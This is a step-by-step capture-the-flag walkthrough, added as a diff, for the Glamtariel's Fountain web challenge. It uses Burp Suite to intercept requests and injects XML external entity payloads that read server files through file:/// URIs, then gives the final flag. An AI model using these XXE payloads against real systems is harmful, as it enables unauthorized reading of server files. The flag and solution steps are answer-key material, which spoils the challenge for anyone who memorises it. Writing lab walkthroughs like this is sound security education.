@@ -1,0 +1,119 @@
+Glamtariels Fountain with Burp Suite
+Webpage: https://glamtarielsfountain.com/
+
+1) Start burp suite community edition > choose temporary project > choose standard/default configuration > Proxy (tab)
+
+2a) Intercept (tab) > Open browser > (this opens a browser with proxy interception already configured, you can skip to step 3).
+
+2b) Proxy settings (tab) > (get the Interface IP address and port number; likely 127.0.0.1 for IP and 8080 for port) > (set up manual proxy)
+**Google Chrome doesn't have an in-browser proxy setting. It uses the system's settings.
+
+3) Navigate to the webpage and keep Intercept off before getting to the last set of images.
+
+4) Drops to get to the last set of images:
+  Kringle => Princess
+  Kringle => Fountain
+  Elf => Princess
+  Elf => Fountain
+  Ring => Princess
+  Boat => Fountain
+  Ring => Fountain => Click Eye
+  Igloo => Fountain
+  1st Blue => Fountain
+  2nd Blue => Fountain
+  Silver => Princess
+  Red => Fountain
+
+5) KEYWORDs along the way:
+  TAMPER (cookies)
+  TRAFFIC FLIES
+  PATH (elf make paths)
+  APP
+  SIMPLE FORMAT (way to track rings)
+  RINGLIST (file, a list)
+  TYPE (of language)
+
+6) Once you get to the last set of images, click "Intercept is off" in Burp to turn it on.
+
+7) Drop any image anywhere to have Burp intercept the request.
+
+8) Burp automatically shows the request. Change content-type to application/xml to start submitting payload/body in xml format:
+
+POST /dropped HTTP/2
+Host: glamtarielsfountain.com
+Cookie: GCLB="94210e1c2cb9b833"; MiniLembanh=9dc94d15-e2ff-414d-9232-e12a5198cdec.v4MRMzrMyvZKdqMuGfIPxbhS6Bc
+Content-Length: 48
+Sec-Ch-Ua: "Not A(Brand";v="24", "Chromium";v="110"
+Accept: application/json
+Content-Type: application/xml
+X-Grinchum: ImU2Y2I2OWYxNTk4YjdhMDQ0MGNiNTNlM2YyZmMxYWQ3MmEwZjM0ZmMi.Y-me-A.ZN9bItMgElKAdiFbNaiBZb2F2tE
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
+Sec-Ch-Ua-Platform: "Windows"
+Origin: https://glamtarielsfountain.com
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://glamtarielsfountain.com/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+
+<?xml version="1.0"?>
+<root>
+<imgDrop>img1</imgDrop>
+<who>princess</who>
+<reqType>xml</reqType>
+</root>
+
+
+9) Click "Forward" to send the modified request.
+
+10) Add !DOCTYPE and !ENTITY (www.youtube.com/watch?v=gjm6VHZa_8s) and request the RINGLIST:
+
+<?xml version="1.0"?>
+<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "file:///app/static/images/ringlist.txt">]>
+<root>
+<imgDrop>&xxe;</imgDrop>
+<who>princess</who>
+<reqType>xml</reqType>
+</root>
+
+
+11) Next clue (https://glamtarielsfountain.com/static/images/pholder-morethantopsupersecret63842.png) image shows x_phial_pholder_2022 folder with red and blue ring. Actual game page has a silver ring so:
+
+<?xml version="1.0"?>
+<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "file:///app/static/images/x_phial_pholder_2022/silverring.txt">]>
+<root>
+<imgDrop>&xxe;</imgDrop>
+<who>princess</who>
+<reqType>xml</reqType>
+</root>
+
+
+12) Next clue (https://glamtarielsfountain.com/static/images/x_phial_pholder_2022/redring-supersupersecret928164.png) image shows a red ring with the phrase goldring_to_be_deleted.txt so:
+
+<?xml version="1.0"?>
+<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "file:///app/static/images/x_phial_pholder_2022/goldring_to_be_deleted.txt">]>
+<root>
+<imgDrop>&xxe;</imgDrop>
+<who>princess</who>
+<reqType>xml</reqType>
+</root>
+
+
+13) New keyword is REQ. Move &xxe; to reqType and put img1 (silver ring) into the imgDrop:
+
+<?xml version="1.0"?>
+<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "file:///app/static/images/x_phial_pholder_2022/goldring_to_be_deleted.txt">]>
+<root>
+<imgDrop>img1</imgDrop>
+<who>princess</who>
+<reqType>&xxe;</reqType>
+</root>
+
+
+14a) Right click on the gold ring image > Open image in new tab > (the flag is in the address bar)
+
+14b) Go to HTTP history (tab) > (view the last POST request) > (the flag is in the value of "visit" of the response)
+
+Flag: goldring-morethansupertopsecret76394734.png
